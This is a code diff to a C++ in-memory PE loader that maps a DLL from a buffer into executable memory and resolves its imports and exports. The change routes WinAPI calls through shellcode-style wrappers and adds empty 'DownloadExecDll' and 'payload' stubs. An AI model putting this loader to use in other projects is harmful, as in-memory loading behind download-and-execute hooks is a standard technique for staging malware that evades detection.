@@ -1,8 +1,10 @@
 #include "include/LoadLibrary.h"
+#include "include/WinAPIShellcode.cpp"
 
-
+extern "C" {
 HMODULE LoadLibraryFomMem(char *buffer, size_t length)
 {
+	if(buffer == NULL) return 0;
 #if defined(_WIN64)
 	size_t headerlen = sizeof(IMAGE_NT_HEADERS64);
 #elif defined(_WIN32)
@@ -51,8 +53,14 @@ HMODULE LoadLibraryFomMem(char *buffer, size_t length)
 		  high = section->Misc.VirtualSize + section->VirtualAddress;
 	  if (section->VirtualAddress < low)
 		  low = section->VirtualAddress;
+		if(length < section->PointerToRawData + section->SizeOfRawData) {
+#ifdef DEBUG
+		  		std::cerr << "file truncated" << std::endl;
+#endif
+					return NULL;
+			}
   }
-  void *ImageBase = (void *)VirtualAlloc(NULL, high, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  void *ImageBase = (void *)MyVirtualAlloc(NULL, high, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
   if (ImageBase == NULL) {
 	  return NULL;
   }
@@ -74,11 +82,12 @@ HMODULE LoadLibraryFomMem(char *buffer, size_t length)
 		  if (thunk1->u1.ForwarderString == 0 || thunk2->u1.AddressOfData == 0) {
 			  break;
 		  }
-		  thunk2->u1.AddressOfData = (ULONGLONG)GetProcAddress(LoadLibraryA((char *)ImageBase + importdescriptor->Name), (char *)ImageBase + thunk1->u1.ForwarderString + 2);
+		  thunk2->u1.AddressOfData = (ULONGLONG)MyGetProcAddress(MyLoadLibrary((char *)ImageBase + importdescriptor->Name), (char *)ImageBase + thunk1->u1.ForwarderString + 2);
 		  if (thunk2->u1.AddressOfData == 0) {
 #ifdef DEBUG
 			  std::cerr << "failed to load" << (char *)ImageBase + importdescriptor->Name << ":" << (char *)ImageBase + thunk1->u1.ForwarderString + 2 << std::endl;
 #endif
+				MyVirtualFree(ImageBase, 0, MEM_RELEASE);
 			  return NULL;
 		  }
 	  }
@@ -89,14 +98,15 @@ HMODULE LoadLibraryFomMem(char *buffer, size_t length)
   for (DWORD secnb = 0; secnb<NT_HEADERS->FileHeader.NumberOfSections; secnb++) {
 	  PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)&buffer[headerlen + sizeof(IMAGE_SECTION_HEADER) * secnb];
 	  DWORD myoldprotect = 0;
-	  VirtualProtect(&((char *)ImageBase)[section->VirtualAddress], section->Misc.VirtualSize, section->Characteristics, &myoldprotect);
+	  MyVirtualProtect(&((char *)ImageBase)[section->VirtualAddress], section->Misc.VirtualSize, section->Characteristics, &myoldprotect);
   }
 #ifdef DEBUG
     std::cerr << "SUCCESS" << std::endl;
 #endif
 	return (HMODULE)ImageBase;
 }
-
+}
+extern "C" {
 FARPROC GetProcAddressFomMem(HMODULE hModule, LPCSTR  lpProcName)
 {
 	if(hModule == NULL)
@@ -113,12 +123,18 @@ FARPROC GetProcAddressFomMem(HMODULE hModule, LPCSTR  lpProcName)
 	}
 	for(DWORD exportnb=0; exportnb < exportdir->NumberOfNames; exportnb++) {
 			LPDWORD name = (LPDWORD)((char *)hModule + exportdir->AddressOfNames + sizeof(DWORD) * exportnb);
-			if(strcmp((char *)hModule + name[0], lpProcName) == 0) {
+	if(mystrcmp((char *)hModule + name[0], (char *)lpProcName)) {
 				LPDWORD funcaddr = (LPDWORD)((char *)hModule + exportdir->AddressOfFunctions + sizeof(DWORD) * exportnb);
 				return (FARPROC)((char *)hModule + funcaddr[0]);
 			}
 	}
 	return NULL;
+}
+}
+
+bool DownloadExecDll(char *url, char *functioname)
+{
+
 }
 
 #ifdef DEBUG
@@ -140,10 +156,15 @@ int main(int argc, char **argv)
 		delete[] buffer;
 	}
 	infile.close();
-
 	typedef void (WINAPI *_hello)(void);
 	_hello hello = (_hello)GetProcAddressFomMem(mylib, "hello");
-	hello();
+	if(hello != NULL)
+		hello();
 	return 0;
+}
+#else
+extern "C" {
+void payload(void) {
+}
 }
 #endif
